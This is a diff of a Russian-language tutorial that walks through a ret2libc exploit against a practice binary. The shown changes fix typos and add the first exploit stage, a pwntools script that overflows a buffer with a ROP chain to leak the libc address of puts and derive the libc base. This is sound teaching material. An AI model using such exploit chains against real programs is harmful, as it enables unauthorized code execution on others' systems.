@@ -7,7 +7,7 @@
 ### Solition
 
 
-#### Step 1 - Проверка средс безопасности - checksec
+#### Step 1 - Проверка средств безопасности - checksec
 
 Смотрим какие средства безопасности были использованы при комплияции бинаря, для этого используется утилита `checksec`:
 
@@ -24,7 +24,7 @@ $ checksec --file=main
     Stripped:   No
 ```
 
-#### Step 2 - Получаем адрес POP RDI
+#### Step 2 - Получаем адрес POP RDI RET
 
 Узнаем адрес `pop rdi; ret`, есть 2 варианта:
 - использовать утилиту `ROPgadget`;
@@ -87,7 +87,7 @@ pwndbg> x/32i ROP
 
 #### Step 3 - Получем адреса puts@plt / puts@got.plt
 
-Требуется получить адреса puts@plt и puts@got.plt, для этого выполняем:
+Требуется получить адреса puts@plt и puts@got.plt, для этого:
  1. выполняем `info functions`
  2. извлекаем адрес обертки `puts@plt`
  3. извлекаем адрес `puts@got.plt` где должен лежать `libc.so`
@@ -113,6 +113,7 @@ Non-debugging symbols:
 0x000000000040114f  func
 0x0000000000401170  main
 0x00000000004011d0  _fini
+
 pwndbg> x/8i 0x0000000000401030
    0x401030 <puts@plt>:	        jmp    QWORD PTR [rip+0x2fca]   # 0x404000 <puts@got.plt>
    0x401036 <puts@plt+6>:	    push   0x0
@@ -131,8 +132,67 @@ pwndbg> x/8i 0x0000000000401030
 
 #### Step 4 - первая честь эксплойта
 
-В вашем коде используется 64-битный calling convention, где первый аргумент передаётся через регистр RDI. Цепочка ROP должна:
+В вашем коде используется 64-битный `calling convention`, где первый аргумент передаётся через регистр `RDI`. Цепочка `ROP` должна:
 
- 1. Положить адрес (в данном случае адрес GOT записи для puts) в RDI
- 2. Вызвать puts@plt (который выведет значение по этому адресу)
- 3. Вернуться в main для второго этапа эксплойта
+ 1. Положить адрес (в данном случае адрес GOT записи для `puts`) в `RDI`
+ 2. Вызвать `puts@plt` (который выведет значение по этому адресу)
+ 3. Вернуться в `main` для второго этапа эксплойта
+
+Пишем первую часть эксплойта, указываем адреса `ROP` гаджета и функции `puts`:
+
+```python
+from pwn import *
+
+# адреса pop_rdi и puts@, берутся из info function для первого BOF
+pop_rdi = 0x40114a
+puts_got = 0x404000
+puts_plt = 0x401030
+
+```
+
+Добавляем запуск приложения, создаем `ROP`-цепочку, затем выводим реальный адрес `puts` в hex формате.
+
+```python
+p = process('../app/main')
+#pause()
+p.recvline()
+p.sendline(b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt))
+
+#puts_addr = p.recv(6)
+puts_addr = int(p.recvline()[:-1][::-1].hex(), 16)
+```
+
+Зная адрес функции puts в `libc.so`, можем узнать базовый адрес `libc.so`, но предварительно нужно узнать сдвиг (offset) используя gdbpwn:
+
+![](img/img6.png)
+
+```c
+$ pwndbg app/main
+
+pwndbg> start
+
+< ... SKIP ... >
+
+pwndbg> xinfo puts
+Extended information for virtual address 0x7ffff7e2f760:
+
+  Containing mapping:
+    0x7ffff7dd8000     0x7ffff7f3d000 r-xp   165000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+
+  Offset information:
+         Mapped Area 0x7ffff7e2f760 = 0x7ffff7dd8000 + 0x57760
+         File (Base) 0x7ffff7e2f760 = 0x7ffff7db0000 + 0x7f760
+      File (Segment) 0x7ffff7e2f760 = 0x7ffff7dd8000 + 0x57760
+         File (Disk) 0x7ffff7e2f760 = /usr/lib/x86_64-linux-gnu/libc.so.6 + 0x7f760
+
+ Containing ELF sections:
+               .text 0x7ffff7e2f760 = 0x7ffff7dd8400 + 0x57360
+pwndbg>
+```
+
+Наш сдвиг равен = `0x7f760`, дописываем первую часть:
+
+```
+# из puts вычитаем сдвиг до начального адреса libc
+libc_addr = puts_addr - 0x7f760
+```
